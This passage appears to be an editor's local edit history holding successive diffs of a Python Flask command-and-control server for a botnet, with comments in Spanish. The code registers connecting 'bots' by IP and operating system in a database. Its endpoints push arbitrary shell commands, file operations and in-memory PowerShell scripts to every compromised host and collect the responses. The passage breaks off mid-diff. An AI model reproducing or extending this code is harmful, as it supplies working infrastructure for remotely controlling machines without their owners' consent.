respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                        break\r\n+                    time.sleep(0.1)\r\n+            except:\r\n+                continue\r\n+\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/shutdown', methods=['POST'])\r\n+def shutdown():\r\n+    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        server_running = False\r\n+        for bot in bots[:]:\r\n+            try:\r\n+                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n+                bot.close()\r\n+            except:\r\n+                pass\r\n+        bots.clear()\r\n+        bot_ids.clear()\r\n+        sistemas_operativos.clear()\r\n+        respuestas_bots.clear()\r\n+        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+from modules.basic_commands import *\r\n+from modules.file_operations import *\r\n+from modules.advanced_execution import *\r\n+\r\n+# Nuevos endpoints despu√©s de los existentes\r\n+@app.route('/execute_command', methods=['POST'])\r\n+def execute_system_command_endpoint():\r\n+    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        command = data.get('command')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/file_operations', methods=['POST'])\r\n+def file_operations_endpoint():\r\n+    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        operation = data.get('operation')\r\n+        path = data.get('path')\r\n+        file_data = data.get('file_data')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"file:{operation}:{path}\"\r\n+                    if file_data:\r\n+                        cmd += f\":{file_data}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+@app.route('/execute_script', methods=['POST'])\r\n+def execute_script_endpoint():\r\n+    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n+    try:\r\n+        data = request.json\r\n+        script = data.get('script')\r\n+        script_type = data.get('type', 'powershell')\r\n+        bot_ids = data.get('bot_ids', [])\r\n+        \r\n+        respuestas = {}\r\n+        for bot in bots:\r\n+            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n+                try:\r\n+                    cmd = f\"script:{script_type}:{script}\"\r\n+                    bot.send(cmd.encode(\"utf-8\"))\r\n+                    bot_id = bot_ids[bot]\r\n+                    # Esperar respuesta\r\n+                    tiempo_inicio = time.time()\r\n+                    while time.time() - tiempo_inicio < 5:\r\n+                        if bot_id in respuestas_bots:\r\n+                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n+                            break\r\n+                        time.sleep(0.1)\r\n+                except:\r\n+                    continue\r\n+        return jsonify({\"respuestas\": respuestas})\r\n+    except Exception as e:\r\n+        return jsonify({\"error\": str(e)}), 500\r\n+\r\n+def iniciar_servidor_cnc():\r\n+    \"\"\"Inicia el servidor CnC.\"\"\"\r\n+    global server_running\r\n+    try:\r\n+        config = cargar_configuracion()\r\n+        configurar_logging(config)\r\n+        \r\n+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n+        host = config.get(\"NETWORK\", \"HOST\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\")  # Usando el puerto CnC\r\n+        server.bind((host, port))\r\n+        server.listen(5)\r\n+        server.settimeout(1)\r\n+        \r\n+        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n+        \r\n+        def accept_wrapper():\r\n+            next_bot_id = 1\r\n+            while server_running:\r\n+                try:\r\n+                    conn, addr = server.accept()\r\n+                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n+                    next_bot_id += 1\r\n+                except socket.timeout:\r\n+                    continue\r\n+                except Exception as e:\r\n+                    if server_running:\r\n+                        logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+        \r\n+        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n+        return True\r\n+        \r\n+    except Exception as e:\r\n+        logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        return False\r\n+\r\n+if __name__ == \"__main__\":\r\n+    try:\r\n+        print(\"[*] Iniciando servidor C&C...\")\r\n+        if iniciar_servidor_cnc():\r\n+            print(\"[+] Servidor C&C iniciado correctamente\")\r\n+            print(\"[*] Iniciando servidor web...\")\r\n+            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")\r\n+            print(\"[*] Servidor web escuchando en http://127.0.0.1:5000\")\r\n+            # Silenciar los mensajes de desarrollo de Flask\r\n+            import logging\r\n+            log = logging.getLogger('werkzeug')\r\n+            log.setLevel(logging.ERROR)\r\n+            # Iniciar Flask sin mensajes de desarrollo\r\n+            app.run(host=\"127.0.0.1\", port=api_port, debug=False, use_reloader=False)\r\n+        else:\r\n+            print(\"[-] Error al iniciar el servidor C&C\")\r\n+            sys.exit(1)\r\n+    except Exception as e:\r\n+        print(f\"[-] Error cr√≠tico: {e}\")\r\n+        sys.exit(1)\r\n"
                },
                {
                    "date": 1740264975182,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -1,4 +1,5 @@\n+from datetime import datetime\r\n from flask import Flask, jsonify, request\r\n import logging\r\n import socket\r\n import sys\r\n@@ -352,359 +353,4 @@\n             sys.exit(1)\r\n     except Exception as e:\r\n         print(f\"[-] Error cr√≠tico: {e}\")\r\n         sys.exit(1)\r\n-from flask import Flask, jsonify, request\r\n-import logging\r\n-import socket\r\n-import sys\r\n-import threading\r\n-import time\r\n-import os\r\n-import ipaddress\r\n-import sqlite3\r\n-import configparser\r\n-\r\n-app = Flask(__name__)\r\n-\r\n-# Variables globales\r\n-bots = []\r\n-bot_ids = {}\r\n-sistemas_operativos = {}\r\n-respuestas_bots = {}\r\n-server_running = True\r\n-\r\n-def cargar_configuracion():\r\n-    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n-    config = configparser.ConfigParser()\r\n-    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n-    return config\r\n-\r\n-def configurar_logging(config):\r\n-    \"\"\"Configura el sistema de logging.\"\"\"\r\n-    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n-    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n-    \r\n-    logging.basicConfig(\r\n-        level=logging.INFO,\r\n-        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n-        handlers=[\r\n-            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n-            logging.StreamHandler()\r\n-        ]\r\n-    )\r\n-\r\n-def aceptar_conexiones(server):\r\n-    \"\"\"Acepta conexiones de bots.\"\"\"\r\n-    global server_running\r\n-    bot_id = 1\r\n-    while server_running:\r\n-        try:\r\n-            conn, addr = server.accept()\r\n-            bots.append(conn)\r\n-            bot_ids[conn] = bot_id\r\n-            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n-            bot_id += 1\r\n-        except socket.timeout:\r\n-            continue\r\n-        except Exception as e:\r\n-            if server_running:\r\n-                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n-\r\n-from modules.database_manager import DatabaseManager\r\n-\r\n-# Inicializar el gestor de base de datos\r\n-db = DatabaseManager(os.path.join(os.path.dirname(__file__), \"..\", \"bbdd\", \"bots.db\"))\r\n-\r\n-def manejar_bot(conn, addr, bot_id):\r\n-    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n-    try:\r\n-        # Esperar identificaci√≥n del bot\r\n-        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n-        if not identificador:\r\n-            conn.close()\r\n-            return\r\n-            \r\n-        # Detectar sistema operativo\r\n-        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n-        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n-        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n-        \r\n-        # Registrar o actualizar bot en la base de datos\r\n-        db_bot_id = db.register_bot(\r\n-            unique_id=identificador,\r\n-            ip_address=addr[0],\r\n-            system_os=sistema,\r\n-            hostname=f\"bot_{bot_id}\",\r\n-            additional_info={\r\n-                \"port\": addr[1],\r\n-                \"connection_time\": datetime.now().isoformat()\r\n-            }\r\n-        )\r\n-        \r\n-        logging.info(f\"Bot {bot_id} registrado en DB con ID {db_bot_id}\")\r\n-        \r\n-        # Agregar a las estructuras en memoria\r\n-        sistemas_operativos[conn] = sistema\r\n-        bots.append(conn)\r\n-        bot_ids[conn] = bot_id\r\n-        \r\n-        # Procesar comandos pendientes\r\n-        pending_commands = db.get_pending_commands(db_bot_id)\r\n-        for cmd in pending_commands:\r\n-            try:\r\n-                conn.send(cmd['command'].encode(\"utf-8\"))\r\n-                # Esperar respuesta\r\n-                response = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if response:\r\n-                    db.store_response(db_bot_id, cmd['command'], response)\r\n-                db.mark_command_executed(cmd['id'])\r\n-            except:\r\n-                continue\r\n-        \r\n-        # Bucle principal de comunicaci√≥n\r\n-        while True:\r\n-            try:\r\n-                data = conn.recv(4096).decode(\"utf-8\", errors=\"ignore\").strip()\r\n-                if not data:\r\n-                    break\r\n-                    \r\n-                # Almacenar respuesta en la base de datos\r\n-                db.store_response(db_bot_id, \"unknown\", data)\r\n-                respuestas_bots[bot_id] = data\r\n-                \r\n-            except:\r\n-                break\r\n-                \r\n-    except Exception as e:\r\n-        logging.error(f\"Error con bot {bot_id}: {e}\")\r\n-    finally:\r\n-        # Marcar bot como inactivo en la base de datos\r\n-        try:\r\n-            db.mark_bot_inactive(db_bot_id)\r\n-        except:\r\n-            pass\r\n-            \r\n-        conn.close()\r\n-        if conn in bots:\r\n-            bots.remove(conn)\r\n-        if conn in bot_ids:\r\n-            del bot_ids[conn]\r\n-        if conn in sistemas_operativos:\r\n-            del sistemas_operativos[conn]\r\n-\r\n-@app.route('/listar_bots', methods=['GET'])\r\n-def listar_bots():\r\n-    \"\"\"Lista todos los bots conectados.\"\"\"\r\n-    try:\r\n-        active_bots = db.get_active_bots()\r\n-        if active_bots:\r\n-            return jsonify([{\r\n-                \"id\": bot[\"id\"],\r\n-                \"unique_id\": bot[\"unique_id\"],\r\n-                \"so\": bot[\"system_os\"].capitalize(),\r\n-                \"ip\": bot[\"ip_address\"],\r\n-                \"hostname\": bot[\"hostname\"],\r\n-                \"last_seen\": bot[\"last_seen\"]\r\n-            } for bot in active_bots])\r\n-        return jsonify({\"message\": \"No hay bots conectados.\"})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-@app.route('/enviar_comando', methods=['POST'])\r\n-def enviar_comando():\r\n-    \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n-    try:\r\n-        data = request.json\r\n-        if not bots:\r\n-            return jsonify({\"message\": \"No hay bots conectados.\"})\r\n-\r\n-        respuestas = {}\r\n-        for bot in bots:\r\n-            try:\r\n-                comando = data[\"comando_windows\"] if sistemas_operativos[bot] == \"windows\" else data[\"comando_linux\"]\r\n-                bot.send(comando.encode(\"utf-8\"))\r\n-                bot_id = bot_ids[bot]\r\n-                \r\n-                # Esperar respuesta\r\n-                tiempo_inicio = time.time()\r\n-                while time.time() - tiempo_inicio < 5:\r\n-                    if bot_id in respuestas_bots:\r\n-                        respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n-                        break\r\n-                    time.sleep(0.1)\r\n-            except:\r\n-                continue\r\n-\r\n-        return jsonify({\"respuestas\": respuestas})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-@app.route('/shutdown', methods=['POST'])\r\n-def shutdown():\r\n-    \"\"\"Apaga el servidor y desconecta todos los bots.\"\"\"\r\n-    global server_running\r\n-    try:\r\n-        server_running = False\r\n-        for bot in bots[:]:\r\n-            try:\r\n-                bot.send(\"shutdown\".encode(\"utf-8\"))\r\n-                bot.close()\r\n-            except:\r\n-                pass\r\n-        bots.clear()\r\n-        bot_ids.clear()\r\n-        sistemas_operativos.clear()\r\n-        respuestas_bots.clear()\r\n-        return jsonify({\"message\": \"Servidor apagado correctamente\"})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-from modules.basic_commands import *\r\n-from modules.file_operations import *\r\n-from modules.advanced_execution import *\r\n-\r\n-# Nuevos endpoints despu√©s de los existentes\r\n-@app.route('/execute_command', methods=['POST'])\r\n-def execute_system_command_endpoint():\r\n-    \"\"\"Ejecuta un comando del sistema en los bots seleccionados.\"\"\"\r\n-    try:\r\n-        data = request.json\r\n-        command = data.get('command')\r\n-        bot_ids = data.get('bot_ids', [])\r\n-        \r\n-        respuestas = {}\r\n-        for bot in bots:\r\n-            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n-                try:\r\n-                    bot.send(f\"cmd:{command}\".encode(\"utf-8\"))\r\n-                    bot_id = bot_ids[bot]\r\n-                    # Esperar respuesta\r\n-                    tiempo_inicio = time.time()\r\n-                    while time.time() - tiempo_inicio < 5:\r\n-                        if bot_id in respuestas_bots:\r\n-                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n-                            break\r\n-                        time.sleep(0.1)\r\n-                except:\r\n-                    continue\r\n-        return jsonify({\"respuestas\": respuestas})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-@app.route('/file_operations', methods=['POST'])\r\n-def file_operations_endpoint():\r\n-    \"\"\"Maneja operaciones con archivos.\"\"\"\r\n-    try:\r\n-        data = request.json\r\n-        operation = data.get('operation')\r\n-        path = data.get('path')\r\n-        file_data = data.get('file_data')\r\n-        bot_ids = data.get('bot_ids', [])\r\n-        \r\n-        respuestas = {}\r\n-        for bot in bots:\r\n-            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n-                try:\r\n-                    cmd = f\"file:{operation}:{path}\"\r\n-                    if file_data:\r\n-                        cmd += f\":{file_data}\"\r\n-                    bot.send(cmd.encode(\"utf-8\"))\r\n-                    bot_id = bot_ids[bot]\r\n-                    # Esperar respuesta\r\n-                    tiempo_inicio = time.time()\r\n-                    while time.time() - tiempo_inicio < 5:\r\n-                        if bot_id in respuestas_bots:\r\n-                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n-                            break\r\n-                        time.sleep(0.1)\r\n-                except:\r\n-                    continue\r\n-        return jsonify({\"respuestas\": respuestas})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-@app.route('/execute_script', methods=['POST'])\r\n-def execute_script_endpoint():\r\n-    \"\"\"Ejecuta scripts en memoria.\"\"\"\r\n-    try:\r\n-        data = request.json\r\n-        script = data.get('script')\r\n-        script_type = data.get('type', 'powershell')\r\n-        bot_ids = data.get('bot_ids', [])\r\n-        \r\n-        respuestas = {}\r\n-        for bot in bots:\r\n-            if not bot_ids or bot_ids.get(bot) in bot_ids:\r\n-                try:\r\n-                    cmd = f\"script:{script_type}:{script}\"\r\n-                    bot.send(cmd.encode(\"utf-8\"))\r\n-                    bot_id = bot_ids[bot]\r\n-                    # Esperar respuesta\r\n-                    tiempo_inicio = time.time()\r\n-                    while time.time() - tiempo_inicio < 5:\r\n-                        if bot_id in respuestas_bots:\r\n-                            respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n-                            break\r\n-                        time.sleep(0.1)\r\n-                except:\r\n-                    continue\r\n-        return jsonify({\"respuestas\": respuestas})\r\n-    except Exception as e:\r\n-        return jsonify({\"error\": str(e)}), 500\r\n-\r\n-def iniciar_servidor_cnc():\r\n-    \"\"\"Inicia el servidor CnC.\"\"\"\r\n-    global server_running\r\n-    try:\r\n-        config = cargar_configuracion()\r\n-        configurar_logging(config)\r\n-        \r\n-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-        host = config.get(\"NETWORK\", \"HOST\")\r\n-        port = config.getint(\"NETWORK\", \"PORT\")  # Usando el puerto CnC\r\n-        server.bind((host, port))\r\n-        server.listen(5)\r\n-        server.settimeout(1)\r\n-        \r\n-        print(f\"[+] Servidor CnC escuchando en {host}:{port}\")\r\n-        \r\n-        def accept_wrapper():\r\n-            next_bot_id = 1\r\n-            while server_running:\r\n-                try:\r\n-                    conn, addr = server.accept()\r\n-                    threading.Thread(target=manejar_bot, args=(conn, addr, next_bot_id)).start()\r\n-                    next_bot_id += 1\r\n-                except socket.timeout:\r\n-                    continue\r\n-                except Exception as e:\r\n-                    if server_running:\r\n-                        logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n-        \r\n-        threading.Thread(target=accept_wrapper, daemon=True).start()\r\n-        return True\r\n-        \r\n-    except Exception as e:\r\n-        logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n-        return False\r\n-\r\n-if __name__ == \"__main__\":\r\n-    try:\r\n-        print(\"[*] Iniciando servidor C&C...\")\r\n-        if iniciar_servidor_cnc():\r\n-            print(\"[+] Servidor C&C iniciado correctamente\")\r\n-            print(\"[*] Iniciando servidor web...\")\r\n-            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")\r\n-            print(\"[*] Servidor web escuchando en http://127.0.0.1:5000\")\r\n-            # Silenciar los mensajes de desarrollo de Flask\r\n-            import logging\r\n-            log = logging.getLogger('werkzeug')\r\n-            log.setLevel(logging.ERROR)\r\n-            # Iniciar Flask sin mensajes de desarrollo\r\n-            app.run(host=\"127.0.0.1\", port=api_port, debug=False, use_reloader=False)\r\n-        else:\r\n-            print(\"[-] Error al iniciar el servidor C&C\")\r\n-            sys.exit(1)\r\n-    except Exception as e:\r\n-        print(f\"[-] Error cr√≠tico: {e}\")\r\n-        sys.exit(1)\r\n"
                },
                {
                    "date": 1740265522191,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -58,9 +58,9 @@\n \r\n from modules.database_manager import DatabaseManager\r\n \r\n # Inicializar el gestor de base de datos\r\n-db = DatabaseManager(os.path.join(os.path.dirname(__file__), \"..\", \"bbdd\", \"bots.db\"))\r\n+db = DatabaseManager()  # Ya no pasamos la ruta, usar√° la predeterminada\r\n \r\n def manejar_bot(conn, addr, bot_id):\r\n     \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n     try:\r\n"
                },
                {
                    "date": 1740266201583,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -74,13 +74,13 @@\n         conn.send(\"detect_os\".encode(\"utf-8\"))\r\n         os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n         sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n         \r\n-        # Registrar o actualizar bot en la base de datos\r\n+        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n         db_bot_id = db.register_bot(\r\n             unique_id=identificador,\r\n             ip_address=addr[0],\r\n-            system_os=sistema,\r\n+            system_info={\"os\": sistema, \"full_info\": os_info},\r\n             hostname=f\"bot_{bot_id}\",\r\n             additional_info={\r\n                 \"port\": addr[1],\r\n                 \"connection_time\": datetime.now().isoformat()\r\n"
                },
                {
                    "date": 1740303035443,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -141,49 +141,64 @@\n @app.route('/listar_bots', methods=['GET'])\r\n def listar_bots():\r\n     \"\"\"Lista todos los bots conectados.\"\"\"\r\n     try:\r\n-        active_bots = db.get_active_bots()\r\n+        active_bots = db.get_active_bots() if db else []\r\n         if active_bots:\r\n             return jsonify([{\r\n                 \"id\": bot[\"id\"],\r\n-                \"unique_id\": bot[\"unique_id\"],\r\n-                \"so\": bot[\"system_os\"].capitalize(),\r\n-                \"ip\": bot[\"ip_address\"],\r\n-                \"hostname\": bot[\"hostname\"],\r\n-                \"last_seen\": bot[\"last_seen\"]\r\n+                \"unique_id\": bot.get(\"unique_id\", \"unknown\"),\r\n+                \"so\": bot.get(\"system_os\", \"unknown\").capitalize(),\r\n+                \"ip\": bot.get(\"ip_address\", \"unknown\"),\r\n+                \"hostname\": bot.get(\"hostname\", f\"bot_{bot['id']}\"),\r\n+                \"last_seen\": bot.get(\"last_seen\", \"never\")\r\n             } for bot in active_bots])\r\n         return jsonify({\"message\": \"No hay bots conectados.\"})\r\n     except Exception as e:\r\n+        app.logger.error(f\"Error en listar_bots: {str(e)}\")\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n @app.route('/enviar_comando', methods=['POST'])\r\n def enviar_comando():\r\n     \"\"\"Env√≠a comandos a los bots.\"\"\"\r\n     try:\r\n         data = request.json\r\n+        if not data:\r\n+            return jsonify({\"error\": \"No se recibieron datos\"}), 400\r\n+            \r\n         if not bots:\r\n             return jsonify({\"message\": \"No hay bots conectados.\"})\r\n \r\n         respuestas = {}\r\n         for bot in bots:\r\n             try:\r\n-                comando = data[\"comando_windows\"] if sistemas_operativos[bot] == \"windows\" else data[\"comando_linux\"]\r\n+                if bot not in sistemas_operativos:\r\n+                    app.logger.warning(f\"Bot sin sistema operativo detectado\")\r\n+                    continue\r\n+                    \r\n+                comando = data.get(\"comando_windows\") if sistemas_operativos[bot] == \"windows\" else data.get(\"comando_linux\")\r\n+                if not comando:\r\n+                    continue\r\n+                    \r\n                 bot.send(comando.encode(\"utf-8\"))\r\n-                bot_id = bot_ids[bot]\r\n+                bot_id = bot_ids.get(bot)\r\n+                if not bot_id:\r\n+                    continue\r\n                 \r\n-                # Esperar respuesta\r\n+                # Esperar respuesta con timeout\r\n                 tiempo_inicio = time.time()\r\n                 while time.time() - tiempo_inicio < 5:\r\n                     if bot_id in respuestas_bots:\r\n                         respuestas[bot_id] = respuestas_bots.pop(bot_id)\r\n                         break\r\n                     time.sleep(0.1)\r\n-            except:\r\n+            except Exception as e:\r\n+                app.logger.error(f\"Error enviando comando a bot {bot_ids.get(bot)}: {str(e)}\")\r\n                 continue\r\n \r\n         return jsonify({\"respuestas\": respuestas})\r\n     except Exception as e:\r\n+        app.logger.error(f\"Error en enviar_comando: {str(e)}\")\r\n         return jsonify({\"error\": str(e)}), 500\r\n \r\n @app.route('/shutdown', methods=['POST'])\r\n def shutdown():\r\n@@ -302,13 +317,17 @@\n     \"\"\"Inicia el servidor CnC.\"\"\"\r\n     global server_running\r\n     try:\r\n         config = cargar_configuracion()\r\n+        if not config:\r\n+            raise ValueError(\"No se pudo cargar la configuraci√≥n\")\r\n+            \r\n         configurar_logging(config)\r\n         \r\n         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n-        host = config.get(\"NETWORK\", \"HOST\")\r\n-        port = config.getint(\"NETWORK\", \"PORT\")  # Usando el puerto CnC\r\n+        host = config.get(\"NETWORK\", \"HOST\", fallback=\"127.0.0.1\")\r\n+        port = config.getint(\"NETWORK\", \"PORT\", fallback=5001)\r\n+        \r\n         server.bind((host, port))\r\n         server.listen(5)\r\n         server.settimeout(1)\r\n         \r\n@@ -324,31 +343,53 @@\n                 except socket.timeout:\r\n                     continue\r\n                 except Exception as e:\r\n                     if server_running:\r\n-                        logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+                        app.logger.error(f\"Error aceptando conexi√≥n: {e}\")\r\n         \r\n         threading.Thread(target=accept_wrapper, daemon=True).start()\r\n         return True\r\n         \r\n     except Exception as e:\r\n-        logging.error(f\"Error iniciando servidor CnC: {e}\")\r\n+        app.logger.error(f\"Error iniciando servidor CnC: {e}\")\r\n         return False\r\n \r\n+# Configurar logging m√°s detallado\r\n+app.logger.setLevel(logging.DEBUG)\r\n+handler = logging.FileHandler(os.path.join(os.path.dirname(__file__), \"..\", \"logs\", \"flask_debug.log\"))\r\n+handler.setLevel(logging.DEBUG)\r\n+app.logger.addHandler(handler)\r\n+\r\n+@app.errorhandler(500)\r\n+def handle_500_error(e):\r\n+    app.logger.error(f'Error interno del servidor: {str(e)}')\r\n+    return jsonify({\r\n+        \"error\": \"Error interno del servidor\",\r\n+        \"details\": str(e)\r\n+    }), 500\r\n+\r\n if __name__ == \"__main__\":\r\n     try:\r\n         print(\"[*] Iniciando servidor C&C...\")\r\n         if iniciar_servidor_cnc():\r\n             print(\"[+] Servidor C&C iniciado correctamente\")\r\n             print(\"[*] Iniciando servidor web...\")\r\n-            api_port = cargar_configuracion().getint(\"NETWORK\", \"API_PORT\")\r\n-            print(\"[*] Servidor web escuchando en http://127.0.0.1:5000\")\r\n-            # Silenciar los mensajes de desarrollo de Flask\r\n-            import logging\r\n-            log = logging.getLogger('werkzeug')\r\n-            log.setLevel(logging.ERROR)\r\n-            # Iniciar Flask sin mensajes de desarrollo\r\n-            app.run(host=\"127.0.0.1\", port=api_port, debug=False, use_reloader=False)\r\n+            config = cargar_configuracion()\r\n+            api_port = config.getint(\"NETWORK\", \"API_PORT\", fallback=5000)\r\n+            print(f\"[*] Servidor web escuchando en http://127.0.0.1:{api_port}\")\r\n+            \r\n+            # Configurar Flask para producci√≥n\r\n+            app.config['ENV'] = 'production'\r\n+            app.config['DEBUG'] = False\r\n+            \r\n+            # Iniciar Flask\r\n+            app.run(\r\n+                host=\"127.0.0.1\", \r\n+                port=api_port, \r\n+                debug=False, \r\n+                use_reloader=False,\r\n+                threaded=True\r\n+            )\r\n         else:\r\n             print(\"[-] Error al iniciar el servidor C&C\")\r\n             sys.exit(1)\r\n     except Exception as e:\r\n"
                },
                {
                    "date": 1740304518089,
                    "content": "Index: \n===================================================================\n--- \n+++ \n@@ -0,0 +1,397 @@\n+from datetime import datetime\r\n+from flask import Flask, jsonify, request\r\n+import logging\r\n+import socket\r\n+import sys\r\n+import threading\r\n+import time\r\n+import os\r\n+import ipaddress\r\n+import sqlite3\r\n+import configparser\r\n+\r\n+app = Flask(__name__)\r\n+\r\n+# Variables globales\r\n+bots = []\r\n+bot_ids = {}\r\n+sistemas_operativos = {}\r\n+respuestas_bots = {}\r\n+server_running = True\r\n+\r\n+def cargar_configuracion():\r\n+    \"\"\"Carga la configuraci√≥n del servidor.\"\"\"\r\n+    config = configparser.ConfigParser()\r\n+    config.read(os.path.join(os.path.dirname(__file__), \"..\", \"config\", \"config.ini\"))\r\n+    return config\r\n+\r\n+def configurar_logging(config):\r\n+    \"\"\"Configura el sistema de logging.\"\"\"\r\n+    log_path = os.path.join(os.path.dirname(__file__), \"..\", config.get(\"LOGGING\", \"LOG_DIR\"), config.get(\"LOGGING\", \"SERVER_LOG_FILE\"))\r\n+    os.makedirs(os.path.dirname(log_path), exist_ok=True)\r\n+    \r\n+    logging.basicConfig(\r\n+        level=logging.INFO,\r\n+        format=\"%(asctime)s - %(levelname)s - %(message)s\",\r\n+        handlers=[\r\n+            logging.FileHandler(log_path, encoding=\"utf-8\"),\r\n+            logging.StreamHandler()\r\n+        ]\r\n+    )\r\n+\r\n+def aceptar_conexiones(server):\r\n+    \"\"\"Acepta conexiones de bots.\"\"\"\r\n+    global server_running\r\n+    bot_id = 1\r\n+    while server_running:\r\n+        try:\r\n+            conn, addr = server.accept()\r\n+            bots.append(conn)\r\n+            bot_ids[conn] = bot_id\r\n+            threading.Thread(target=manejar_bot, args=(conn, addr, bot_id)).start()\r\n+            bot_id += 1\r\n+        except socket.timeout:\r\n+            continue\r\n+        except Exception as e:\r\n+            if server_running:\r\n+                logging.error(f\"Error aceptando conexi√≥n: {e}\")\r\n+\r\n+from modules.database_manager import DatabaseManager\r\n+\r\n+# Inicializar el gestor de base de datos\r\n+db = DatabaseManager()  # Ya no pasamos la ruta, usar√° la predeterminada\r\n+\r\n+def manejar_bot(conn, addr, bot_id):\r\n+    \"\"\"Maneja la conexi√≥n con un bot.\"\"\"\r\n+    try:\r\n+        # Esperar identificaci√≥n del bot\r\n+        identificador = conn.recv(1024).decode(\"utf-8\").strip()\r\n+        if not identificador:\r\n+            conn.close()\r\n+            return\r\n+            \r\n+        # Detectar sistema operativo\r\n+        conn.send(\"detect_os\".encode(\"utf-8\"))\r\n+        os_info = conn.recv(1024).decode(\"utf-8\").strip().lower()\r\n+        sistema = \"windows\" if \"windows\" in os_info else \"linux\"\r\n+        \r\n+        # Registrar o actualizar bot en la base de datos usando los par√°metros correctos\r\n+        db_bot_id = db.register_bot(\r\n+            unique_id=identificador,\r\n+            ip_address=addr[0],\r\n+            system_info={\"os\": sistema, \"full_info\": os_info},\r\n+            hostname=f\"bot_{bot_id}\",\r\n+            additional_info={\r\n+                \"port\": addr[1],\r\n+                \"connection_time\": 